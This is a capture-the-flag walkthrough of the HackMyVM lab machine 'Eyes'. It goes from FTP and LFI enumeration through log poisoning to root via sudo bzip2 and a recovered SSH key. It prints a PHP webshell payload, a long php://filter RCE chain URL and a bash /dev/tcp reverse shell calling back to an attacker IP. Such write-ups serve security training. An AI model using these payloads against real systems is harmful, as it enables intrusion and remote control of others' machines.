# HackMyVM — Eyes

## Machine Information

- **Machine:** Eyes
- **Platform:** HackMyVM
- **Difficulty:** Medium
- **Operating System:** Linux
- **Target IP:** `192.168.56.150`

---

## 1. Initial Enumeration

Today we are back with another HackMyVM machine named **Eyes**, a medium-difficulty Linux target.

The target IP was provided directly on the machine banner.

![Eyes Machine Banner](URL 1)

Our target IP:

```text
192.168.56.150
```

We started with an all-port Nmap scan.

![Nmap All-Port Scan](URL 2)

```bash
nmap -p- 192.168.56.150
```

The scan revealed three open ports:

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Next, we performed service and version detection.

![Nmap Service Detection](URL 3)

```bash
nmap -sC -sV -p 21,22,80 192.168.56.150
```

Important findings:

```text
21/tcp open  ftp  vsftpd 3.0.3
22/tcp open  ssh  OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http nginx 1.14.2
```

The FTP service allowed anonymous login, making it the first service to investigate.

---

## 2. Anonymous FTP Enumeration

We connected to the FTP service.

![FTP Enumeration](URL 4)

```bash
ftp 192.168.56.150
```

The FTP server allowed anonymous access and exposed a file named `index.php`.

The file appeared to be associated with the web application, suggesting that FTP and the web server might share related files or directories.

![FTP and Web Server Relationship](URL 5)

We investigated whether we could upload a PHP reverse shell through FTP and then access it through the web server. However, the FTP account did not have permission to upload files.

![FTP Upload Permission Denied](URL 6)

Since direct upload was unavailable, we moved on to web application enumeration.

---

## 3. Local File Inclusion (LFI)

After further web fuzzing, we discovered a Local File Inclusion (LFI) vulnerability.

![LFI Discovery](URL 7)

The vulnerability allowed us to read local files through the web application. We tested file access and used it to inspect system information, including `/etc/passwd`.

This provided useful information about local users, including **Monica**, who became a potential target for further privilege escalation.

---

## 4. FTP Log Poisoning

Since FTP was accessible and the application had an LFI vulnerability, we investigated whether FTP logs could be poisoned and then included through the web application.

The idea was to inject PHP code into a value recorded by the FTP service and subsequently access that log through the LFI vulnerability.

The PHP payload used in the notes was:

```php
<?php system($_GET['cmd']); ?>
```

![FTP Log Poisoning Payload](URL 8)

If the injected PHP code is written into a log file that the web application can include, a request parameter such as `cmd` may be used to execute commands on the target.

### Alternative: PHP Filter Chain

The notes also contain a long PHP filter-chain payload intended to access the application through `php://filter` and execute a command.

The original payload was:

```text
http://192.168.56.150/?fil3=php://filter/convert.%2569conv.UTF8.CSISO2022KR|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM921.NAPLPS|convert.%2569conv.855.CP936|convert.%2569conv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.IBM869.UTF16|convert.%2569conv.L3.CSISO90|convert.%2569conv.UCS2.UTF-8|convert.%2569conv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.8859_3.UTF16|convert.%2569conv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.865.UTF16|convert.%2569conv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.UTF16LE|convert.%2569conv.UTF8.CSISO2022KR|convert.%2569conv.UCS2.UTF8|convert.%2569conv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CSIBM1161.UNICODE|convert.%2569conv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.ISO2022KR.UTF16|convert.%2569conv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id
```

![Command Execution Result](URL 9)

The notes show that command execution was achieved and that the web process was running as `www-data`.

---

## 5. Getting a Reverse Shell

After obtaining command execution, we used a Bash reverse shell to connect back to the attacking machine.

The payload in the notes was:

```text
bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.106%2F4567%20%200%3E%261'
```

Start a listener on the attacking machine. The notes show port `4444` for the listener, so ensure that the payload's callback port matches the listener port.

```bash
nc -lvnp 4444
```

The connection was received:

```text
Connection received on 192.168.56.150
www-data@eyes:~/html$
```

We now had an initial shell as `www-data`.

---

## 6. Shell Stabilization

The initial reverse shell was not fully interactive, so we stabilized it before continuing.

![Stabilized Shell](URL 10)

A typical shell stabilization sequence is:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then, from the local terminal, press `Ctrl+Z` and run:

```bash
stty raw -echo
fg
```

Once back in the remote shell:

```bash
export TERM=xterm
```

With a more usable shell, we could begin searching for privilege-escalation paths.

---

## 7. Privilege Escalation: www-data to Monica

We enumerated files owned by Monica:

```bash
find / -type f -user monica 2>/dev/null
```

During enumeration, we discovered an interesting file:

```text
/opt/note.txt
```

![Monica Notes](URL 11)

The note mentioned Monica's work on a new `ls` program and C-language source code. This suggested that a custom binary might provide a route to a more privileged shell.

We examined the program's source code.

![Custom ls Source Code](URL 12)

The notes indicate that the program accepted a name and then executed `ls`. We tested the program with a long input:

```bash
./ls
```

Input:

```text
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabash
```

The program responded:

```text
Hi aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabash, Im executing ls
Output:
```

![Monica Shell](URL 13)

The notes show that this step led to a shell as Monica. The exact source-code flaw and exploitation steps are not included in the supplied notes, so the specific vulnerability cannot be confirmed from the text alone.

Once the Monica shell was obtained, we inspected the user's home directory:

```bash
cd /home/monica
ls
```

The directory contained:

```text
flag.sh
user.txt
```

We read the user flag:

```bash
cat user.txt
```

At this stage, we had access as Monica and could continue toward root.

---

## 8. Privilege Escalation: Monica to Root

We checked Monica's sudo permissions:

```bash
sudo -l
```

The output showed:

```text
User monica may run the following commands on eyes:

(ALL) NOPASSWD: /usr/bin/bzip2
```

This meant Monica could run `bzip2` as root without entering a password.

![Sudo Permissions](URL 14)

We investigated this permitted binary as the final privilege-escalation path.

The notes indicate that a root SSH private key was recovered during this step.

![Root SSH Key](URL 15)

After saving the recovered key, we set restrictive permissions:

```bash
nano id_rsa
chmod 600 id_rsa
```

We then used the key to connect to the target as root:

```bash
ssh -i id_rsa root@192.168.56.150
```

The root login succeeded.

![Root Shell](URL 16)

We verified the account:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We had successfully obtained root access.

---

## Attack Chain

```text
Initial IP Discovery
        |
        v
Nmap Enumeration
        |
        v
Anonymous FTP Access
        |
        v
Web Application Enumeration
        |
        v
Local File Inclusion (LFI)
        |
        v
FTP Log Poisoning / PHP Filter Chain
        |
        v
Command Execution as www-data
        |
        v
Reverse Shell
        |
        v
Custom Binary Investigation
        |
        v
Shell as Monica
        |
        v
Sudo Enumeration
        |
        v
Abuse of Permitted bzip2
        |
        v
Recover Root SSH Private Key
        |
        v
SSH as root
```

---

## Key Takeaways

- Anonymous FTP access can expose application files and reveal relationships between FTP and web services.
- Failed FTP uploads do not rule out other attack paths; web enumeration may reveal vulnerabilities elsewhere.
- Local File Inclusion can become a route to code execution when combined with log poisoning or other writable resources.
- Custom C programs should be reviewed carefully for unsafe input handling and command execution.
- Enumeration after obtaining an initial shell is essential for discovering files, users, and privilege-escalation opportunities.
- Sudo permissions should be checked for every compromised account.
- Permitting powerful utilities such as `bzip2` to run as root can create privilege-escalation risks.
- SSH private keys must be protected and should never be exposed through unsafe file permissions or command execution.

---

## Final Result

**Machine Pwned.**

The documented path was:

```text
Anonymous FTP
→ LFI
→ Command Execution
→ Reverse Shell as www-data
→ Custom Binary / Monica Access
→ Sudo bzip2
→ Root SSH Key
→ Root Shell
```
